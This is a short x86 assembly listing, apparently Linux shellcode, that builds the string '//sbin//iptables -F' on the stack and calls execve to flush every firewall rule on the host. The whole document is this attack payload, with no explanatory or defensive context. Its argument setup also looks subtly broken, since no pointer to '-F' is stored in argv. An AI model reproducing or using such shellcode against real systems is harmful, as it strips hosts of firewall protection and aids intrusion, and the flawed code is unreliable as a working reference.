section .text

global _start

_start:
	push 0x5a462d5a			; //sbin//iptablesZ-FZ
	push 0x73656c62
	push 0x61747069
	push 0x2f2f6e69
	push 0x62732f2f
	mov esi, esp
	cdq						; edx = 0
	mov eax, edx			; eax = 0
	mov byte [esi+16], dl	; null Z: //sbin//iptablesZ
	mov byte [esi+19], dl   ; null Z: -FZ
	mov al, 0x0b			; sys_execve
	mov	ebx, esi			; const char *filename
	mov [esi+20], ebx
	lea ecx, [esi+20]  		; char *const argv[]
	int	0x80
